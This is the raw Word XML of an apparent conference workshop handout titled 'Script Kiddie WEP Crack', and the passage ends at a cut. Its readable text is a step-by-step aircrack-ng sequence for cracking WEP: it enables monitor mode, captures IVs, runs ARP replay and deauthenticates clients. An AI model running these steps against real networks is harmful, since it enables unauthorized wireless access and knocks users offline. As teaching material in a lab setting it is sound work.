    <w:p w14:paraId="1C296CAC" w14:textId="77777777" w:rsidR="00E46969" w:rsidRDefault="00E46969" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5EE88DA9" w14:textId="77777777" w:rsidR="00AF4F0D" w:rsidRDefault="00AF4F0D" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FD6D8A6" w14:textId="77777777" w:rsidR="00B906C4" w:rsidRDefault="00B906C4" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A4C3328" w14:textId="24F977F1" w:rsidR="0012143E" w:rsidRDefault="0012143E" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Script Kiddie </w:t>
      </w:r>
      <w:r w:rsidR="00610997">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve">WEP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t>Crack</w:t>
      </w:r>
      <w:r w:rsidR="00FD0ABD">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve"> (10,000 IVs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="587DD627" w14:textId="77777777" w:rsidR="009D5939" w:rsidRDefault="009D5939" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A4B4C0E" w14:textId="35851496" w:rsidR="00FD0ABD" w:rsidRPr="00FD0ABD" w:rsidRDefault="00FD0ABD" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00FD0ABD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Airmon-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00FD0ABD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> start wlan1 11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CD72A79" w14:textId="77777777" w:rsidR="00FD0ABD" w:rsidRDefault="00FD0ABD" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E7DD113" w14:textId="20207074" w:rsidR="00533BE5" w:rsidRPr="009D5939" w:rsidRDefault="00533BE5" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D5939">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>In Console 1:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28532AEC" w14:textId="251567C8" w:rsidR="0012143E" w:rsidRDefault="00B62550" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="000A4CF1" w:rsidRPr="000A4CF1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>irodump</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="000A4CF1" w:rsidRPr="000A4CF1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000A4CF1" w:rsidRPr="000A4CF1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008928E2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:r w:rsidR="000A4CF1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">channel 1 wlan0mon </w:t>
      </w:r>
      <w:r w:rsidR="008928E2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>--write channel1 –-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008928E2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="008928E2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008928E2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>AP_mac_address</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5F18FB08" w14:textId="77777777" w:rsidR="008928E2" w:rsidRDefault="008928E2" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A366F2C" w14:textId="6C20EF0F" w:rsidR="008928E2" w:rsidRPr="009D5939" w:rsidRDefault="00533BE5" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D5939">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">In </w:t>
      </w:r>
      <w:r w:rsidR="003A12F0" w:rsidRPr="009D5939">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Console 2</w:t>
      </w:r>
      <w:r w:rsidRPr="009D5939">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59297102" w14:textId="377616F1" w:rsidR="00533BE5" w:rsidRDefault="00B62550" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="0086290C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="0086290C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0086290C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> –-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0086290C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arpreplay</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0086290C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007A4D90">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>–e BSIDES wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35B21938" w14:textId="77777777" w:rsidR="007A4D90" w:rsidRDefault="007A4D90" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65EAFC80" w14:textId="38C314BA" w:rsidR="007A4D90" w:rsidRPr="009D5939" w:rsidRDefault="00E5420F" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D5939">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">In </w:t>
      </w:r>
      <w:r w:rsidR="003A12F0" w:rsidRPr="009D5939">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Console 3</w:t>
      </w:r>
      <w:r w:rsidRPr="009D5939">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F7D3DBB" w14:textId="61A2103C" w:rsidR="00E5420F" w:rsidRDefault="00B62550" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="OLE_LINK1"/>
      <w:bookmarkStart w:id="2" w:name="OLE_LINK2"/>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="00E5420F">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00E5420F">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E5420F">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> –</w:t>
      </w:r>
      <w:r w:rsidR="00F16E8E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F16E8E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>de</w:t>
      </w:r>
      <w:r w:rsidR="00E5420F">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>auth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E5420F">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0 </w:t>
      </w:r>
      <w:r w:rsidR="00AB31EB">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>–</w:t>
      </w:r>
      <w:r w:rsidR="00F16E8E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidR="00AB31EB">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> BSIDES </w:t>
      </w:r>
      <w:r w:rsidR="00D242DE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">–h </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00D242DE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>client_mac</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00D242DE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00AB31EB">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61E1F1AC" w14:textId="0C947772" w:rsidR="00AB31EB" w:rsidRDefault="0057646A" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Ctr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-C</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="1"/>
    <w:bookmarkEnd w:id="2"/>
    <w:p w14:paraId="2EFA90A7" w14:textId="77777777" w:rsidR="00B62550" w:rsidRDefault="00B62550" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D8C30A8" w14:textId="0469B80F" w:rsidR="00B62550" w:rsidRPr="009D5939" w:rsidRDefault="00B62550" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
